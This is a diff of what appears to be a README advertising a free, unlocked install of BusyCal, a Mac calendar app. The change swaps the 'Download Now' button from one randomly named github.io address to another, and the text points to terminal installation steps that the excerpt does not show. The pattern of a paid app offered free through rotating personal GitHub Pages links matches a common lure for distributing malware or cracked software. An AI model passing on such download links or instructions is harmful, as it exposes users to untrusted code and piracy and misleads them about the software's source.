@@ -3,7 +3,7 @@
 
 BusyCal is a powerful, user-friendly calendar app for Mac OS, designed to streamline your scheduling and boost productivity. Follow the instructions below to install BusyCal for free and unlock advanced calendar management features.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/busycal)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/busycal)
 
 If you encounter issues downloading via the button above, follow the terminal command installation instructions below.
 
